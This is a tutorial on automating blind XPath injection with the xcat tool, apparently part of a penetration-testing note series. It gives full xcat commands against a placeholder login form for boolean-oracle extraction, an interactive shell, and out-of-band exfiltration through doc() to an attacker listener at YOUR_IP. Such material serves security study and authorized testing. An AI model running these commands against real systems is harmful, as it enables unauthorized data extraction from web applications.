# XPath Injection — Automation with xcat

## 1. Why xcat, and Why It's Not "sqlmap for XML"

`xcat` (originally by `orf`, also packaged on PyPI) is the closest real-world equivalent to
`sqlmap` for **blind XPath injection** specifically. It is not a full equivalent in capability —
there is no XPath injection tool that automates discovery, fingerprinting, and exploitation as
comprehensively as `sqlmap` does for SQL — but for the boolean-blind extraction technique covered
in file 2, it is the standard tool referenced across industry write-ups (NetSPI, PayloadsAllTheThings)
and CTF solve guides.

**What `xcat` does NOT do, stated honestly:**

- It does not auto-detect whether a parameter is injectable — you must already know that (via the
  manual error-based / boolean oracle steps in file 2) and supply the true/false discriminator
  yourself.
- It only automates the **boolean-blind extraction loop** (the character-by-character /
  binary-search work from section 2.4 of file 2) — it does not perform authentication bypass for
  you, and it does not handle non-blind/direct-reflection extraction (section 3 of file 2), since
  that case doesn't need automation — you just read the response.
- It assumes XPath 1.0 functions are available unless the target's engine exposes XPath 2.0
  features, in which case it can use faster retrieval functions if present.

## 2. Installation

```bash
pip install xcat
```

- This installs the `xcat` command-line entry point along with its Python dependencies
  (`requests`, `docopt` for CLI parsing, and an async HTTP layer for concurrent requests).
- Requires Python 3.5+ (some forks/docs note 3.7+ — check `xcat --version` after install if
  commands behave unexpectedly).

## 3. Core Usage — Required Arguments, Broken Down

**Base command structure:**

```bash
xcat http://target.com/login target_param --method=POST --body --true-string="Welcome back"
```

**Piece by piece:**

- `http://target.com/login` — the target URL that contains the vulnerable XPath query.
- `target_param` — the specific parameter name (form field or query string key) that is actually
  injectable. You only point `xcat` at the *one* parameter you've already confirmed is vulnerable
  via the manual oracle technique in file 2, section 2.1 — `xcat` does not scan multiple
  parameters for you.
- `--method=POST` — sets the HTTP method `xcat` uses when sending its generated payloads. Defaults
  to GET if omitted, which is wrong for almost any real login form, so this flag is required for
  most realistic auth-bypass-adjacent targets.
- `--body` — tells `xcat` to send the injected parameter as part of the request body (form-encoded
  data), rather than appending it to the URL as a query string parameter. Required whenever you're
  targeting a POST form field rather than a GET parameter.
- `--true-string="Welcome back"` — **this is the boolean oracle itself**, supplied directly to the
  tool. You give `xcat` a literal substring that only appears in the HTTP response when your
  injected condition evaluates to true (e.g., text that only shows up on a successful login page).
  `xcat` then builds every subsequent payload, sends it, and checks whether this string is present
  in the response to decide true/false — this is the automated version of the manual oracle
  comparison from file 2, section 2.1, just executed thousands of times per second instead of by
  hand.

**Alternative oracle using HTTP status code instead of response body content:**

```bash
xcat http://target.com/login target_param --method=POST --body --true-code=200
```

- `--true-code=200` — uses the HTTP status code of the response as the discriminator instead of
  matching text. Useful when the application's true/false behavior manifests as a redirect
  (`302` on failure, `200` on success, for example) rather than differing page content — this
  avoids false negatives from minor whitespace/dynamic-content differences that can break a
  text-match oracle.

**Negating the match (when it's easier to define a "false" string than a "true" one):**

```bash
xcat http://target.com/login target_param --method=POST --body --true-string="!Invalid credentials"
```

- The `!` prefix on the string **inverts** the match — `xcat` now interprets the *absence* of
  "Invalid credentials" in the response as the true condition. This matters in practice because
  many login failure pages are far more textually consistent ("Invalid credentials" always
  appears verbatim on failure) than success pages (which might include dynamic session data,
  timestamps, or a username that varies per test), making the failure string a more reliable
  literal match target.

## 4. Performance and Reliability Flags

```bash
xcat http://target.com/login target_param --method=POST --body --true-string="Welcome" --fast --concurrency=20
```

- `--fast` — limits string-value retrieval to only the first 15 characters of each extracted
  value. Useful for a first reconnaissance pass across many fields (you don't need a full 40
  character password hash to confirm a field is interesting — you need to know it's there and
  roughly what it looks like) before committing to a full extraction run on the specific value you
  actually want.
- `--concurrency=20` — sets how many simultaneous HTTP connections `xcat` opens to the target while
  running its binary-search character extraction. Directly trades off extraction speed against
  the risk of tripping rate-limiting or WAF anomaly-detection thresholds — on an engagement with
  explicit scope/rules-of-engagement around request volume, this needs to be tuned down
  deliberately, not left at a tool's aggressive default.
- `--cookie=<cookie>` — attaches a session cookie string to every request `xcat` sends, required
  whenever the injectable endpoint sits behind an authenticated session (e.g., exploiting an
  XPath injection in an authenticated search feature rather than the login form itself).

## 5. Retrieving the Whole Document vs Targeted Extraction

```bash
xcat http://target.com/login target_param --method=POST --body --true-string="Welcome" --features
```

- `--features` — before running full extraction, this flag has `xcat` probe the target to detect
  which XPath capabilities are actually available (XPath 1.0 vs 2.0 functions, whether `doc()` is
  enabled for out-of-band retrieval). This directly answers the version-dependency caveat raised
  in file 2, section 2.4 — instead of guessing whether `string-to-codepoints()` is usable, `xcat`
  checks first and picks the fastest retrieval method the engine actually supports.

```bash
xcat http://target.com/login target_param --method=POST --body --true-string="Welcome" --shell
```

- `--shell` — drops into an interactive pseudo-shell once a working injection is confirmed,
  letting you issue ad-hoc XPath sub-expressions and see extracted results live rather than
  running one fixed extraction command — this is the closest `xcat` gets to `sqlmap`'s `--sql-shell`
  equivalent, useful for exploratory work once you already know the injection works and want to
  probe specific nodes interactively (e.g., checking a hunch about an attribute name) without
  writing a new full command each time.

## 6. Out-of-Band Retrieval (Engine-Dependent)

```bash
xcat http://target.com/login target_param --method=POST --body --true-string="Welcome" --oob-ip=YOUR_IP --oob-port=8000
```

- `--oob-ip` / `--oob-port` — these instruct `xcat` to attempt extraction via the XPath `doc()`
  function rather than the standard boolean character-by-character loop. If the target's XPath
  engine has `doc()` enabled (it fetches the content of a URI as a document), `xcat` can coerce
  the *target server itself* to make an outbound HTTP request back to an attacker-controlled
  listener at `YOUR_IP:8000`, embedding extracted data directly in that outbound request URL —
  this is conceptually identical to DNS/HTTP out-of-band exfiltration in blind SQL injection, and
  when it works, it is dramatically faster than the binary-search loop because it can retrieve
  large chunks of data in a single request rather than one bit of information per request.
- This only works if `doc()` is enabled and the target server can actually reach your listener
  over the network (no egress filtering blocking outbound HTTP from the target) — on an internal
  engagement with strict egress controls, this technique frequently fails even when `doc()` itself
  is technically callable.

## 7. Real-World Notes

- `xcat` assumes a binary, repeatable true/false signal. On targets with anti-automation
  protections (rate limiting that returns inconsistent responses under burst load, or WAFs that
  selectively block requests matching XPath metacharacter patterns), raw `xcat` runs frequently
  produce noisy/incorrect extraction — dial `--concurrency` down and verify the oracle manually
  with a handful of requests before trusting a long automated run.
- Because XPath syntax is nearly identical across libxml2 (PHP), `javax.xml.xpath` (Java), and
  .NET's `XPathNavigator`, the same `xcat` invocation against the same injection point typically
  works unmodified regardless of the backend language — this portability is the main practical
  advantage of using `xcat` over hand-rolling a Python extraction script, and it mirrors why
  `sqlmap` payloads need far more dialect-specific handling in the SQL world than `xcat` needs
  here.
